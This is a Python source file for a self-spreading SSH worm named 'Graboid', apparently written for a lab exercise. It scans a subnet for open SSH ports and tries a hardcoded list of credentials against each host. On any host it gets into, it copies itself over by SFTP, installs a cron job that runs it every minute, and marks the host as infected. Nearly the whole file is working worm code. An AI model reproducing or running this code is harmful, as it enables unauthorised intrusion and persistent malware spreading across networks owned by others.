#!/usr/bin/env python3
#    _____           _           _     _ 
#   / ____|         | |         (_)   | |
#  | |  __ _ __ __ _| |__   ___  _  __| |
#  | | |_ | '__/ _` | '_ \ / _ \| |/ _` |
#  | |__| | | | (_| | |_) | (_) | | (_| |
#   \_____|_|  \__,_|_.__/ \___/|_|\__,_|
                                       

#   G)gggg R)rrrrr    A)aa   B)bbbb    O)oooo  I)iiii D)dddd   
#  G)      R)    rr  A)  aa  B)   bb  O)    oo   I)   D)   dd  
# G)  ggg  R)  rrr  A)    aa B)bbbb   O)    oo   I)   D)    dd 
# G)    gg R) rr    A)aaaaaa B)   bb  O)    oo   I)   D)    dd 
#  G)   gg R)   rr  A)    aa B)    bb O)    oo   I)   D)    dd 
#   G)ggg  R)    rr A)    aa B)bbbbb   O)oooo  I)iiii D)ddddd  
                                                             
                                                             
                                             
                                     


## IMPORTS ##
import paramiko
import sys
import socket
import nmap
import os
import netifaces
import random



## Helper Functs ##
#List of credentails to attempt login
Credential_List = [
("msfadmin", "msfadmin"),
("valmck", "C4nUFlyUSuck3r"),
("earlbas", "P4rd0nMyFr3nch "),
("burtgum", "Wr0ngR3cR00m"),
("rhonaleb", "RunL1keGDb4st4rds"),
]


#Worm markers
infected_Marker = "/tmp/is_infected.txt"
worm_Loc = "/tmp/Graboid"
loopback = "lo"
host_Marker = "/home/kali/Desktop/base.txt"
worm_Msg = "They say there's nothing new under the sun. But under the ground..."
comp_Msg = "There be a Graboid in these parts"


#Returns list of IP address on the listed network
def scanner():
  portScanner = nmap.PortScanner()
  portScanner.scan("172.31.19.1/24", arguments = "-p 22 --open")

  return portScanner.all_hosts()

#isInfectedSystem
def ifInfected(sftpTGT):
  #See if target has already been visited by the Graboid
  try:
    sftpTGT.stat(infected_Marker)
    return True
  except IOError:
    return False

#markInfected
def isInfected():
  #Recognize infection and leave a calling card
  infect_tag = open(infected_Marker, "w")
  infect_tag.write(worm_Msg)
  infect_tag.close()

#Spread and execute
def tunnelexe(sshTGT, sftpTGT):
    try:
        sftpTGT.put("/tmp/Graboid", "/tmp/" + "Graboid")       
        sshTGT.exec_command('(crontab -l 2>/dev/null; echo "*/1 * * * * /tmp/Graboid > /tmp/test.log") | crontab -')
        sshTGT.exec_command("chmod a+x /tmp/Graboid")

    except:
        print(sys.exc_info()[0])


#Attempt to ssh into target with selected username, password, and SSH class instance sshTGT
def tryCreds(host, userName, _password, sshClient):
  try:
    sshClient.connect(host, username=userName, password=_password)
    return 0
  except paramiko.ssh_exception.AuthenticationException:
    return 1
  except socket.error:
    return 3

#Dictionary attack against the host
def GraboidATTACK(host):
  global Credential_List
  ssh = paramiko.SSHClient()
  ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
  for (username, password) in Credential_List:

    if tryCreds(host, username, password, ssh) == 0:
      print("Success with " + host + " " + username + " " + password)
      return (ssh, username, password)
    elif tryCreds(host, username, password, ssh) == 1:
      print("Wrong Credentials on host " + host)
      continue
    elif tryCreds(host, username, password, ssh) == 3:
      print("Wrong Credentials on host " + host)
      break

      return None

#Determines the ip of the machine it is currently on
def thisIP(interface):
 
  networkInter = netifaces.interfaces()
  ip_addr = ""
  for net in networkInter:
    addr = netifaces.ifaddresses(net)[2][0]['addr']
    if not addr == "127.0.0.1":
      ip_addr = addr
      break

  return ip_addr


### MAIN FUNCTION ###
def main():
  if len(sys.argv) < 2 and not os.path.exists(host_Marker):

    if os.path.exists(infected_Marker):
      print(comp_Msg)
      # sys.exit()


    try:
        print("[TAGGING . . . ]")
        isInfected()
    except:
        tagging_error = sys.exc_info()[0]
        print(tagging_error)


  interface_list = netifaces.interfaces()
  interface_list.remove(loopback)
  networkHosts = scanner()
  print(interface_list)

  for interface in interface_list:
    print("Interface: ", interface)

    ip_addr = thisIP(interface)
  
    print(ip_addr)
    
  print(networkHosts)

  #removes current machine's IP
  for ip in networkHosts:
    if ip in ip_addr:
      networkHosts.remove(ip)
      break
    else:
      continue  
    
  #suffle hosts for spreading
  random.shuffle(networkHosts)

  print("Found hosts: ", networkHosts)
  
  sshinfo = GraboidATTACK(networkHosts[0])
  print(sshinfo)

  if sshinfo:
    print("Creds Found! Connecting!!")
    sftpTGT = sshinfo[0].open_sftp()
    
    if not ifInfected(sftpTGT):
      try:
        print("Graboiding?")
        tunnelexe(sshinfo[0],sftpTGT)
      except:
        graboid_error = sys.exc_info()[0]
        print(graboid_error)
    else:
      print("Graboid was already here!")
    
    sftpTGT.close()

### DUNDER CHECK ###
if __name__ == "__main__":
  main()